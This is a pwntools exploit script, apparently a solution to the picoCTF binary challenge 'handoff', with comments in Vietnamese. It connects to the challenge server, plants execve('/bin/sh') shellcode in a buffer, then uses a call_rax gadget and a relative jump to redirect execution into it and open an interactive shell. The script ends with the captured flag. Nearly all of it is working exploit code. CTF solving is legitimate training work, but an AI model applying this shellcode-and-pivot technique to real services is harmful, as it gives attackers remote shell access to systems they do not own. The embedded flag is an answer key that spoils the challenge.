#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./handoff", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = 
#     '''
#     b*vuln+0xcf
#     b*vuln+0x1e5
#     ''')
con = remote("shape-facility.picoctf.net", 50266)

# stage 1: add shellcode vào buffer
binsh = u64("/bin/sh\0")

shellcode = asm(
    f'''
    mov rax, 0x3b
    mov rdi, {binsh} 
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch = 'amd64')

input()
con.sendlineafter(b"Exit the app\n", b"1")
con.sendlineafter(b"recipient's name: \n", shellcode)

# stage 2: ghi jmp vào phần được gọi
call_rax = p64(0x0000000000401014)
shellcode = asm(
    f'''
    jmp $-0x2d4
    ''', arch = 'amd64')
payload = shellcode.ljust(0x14) + call_rax
con.sendlineafter(b"Exit the app\n", b"3")
con.sendlineafter(b"really appreciate it: \n", payload)

con.interactive()

# picoCTF{p1v0ted_ftw_429ad40a}
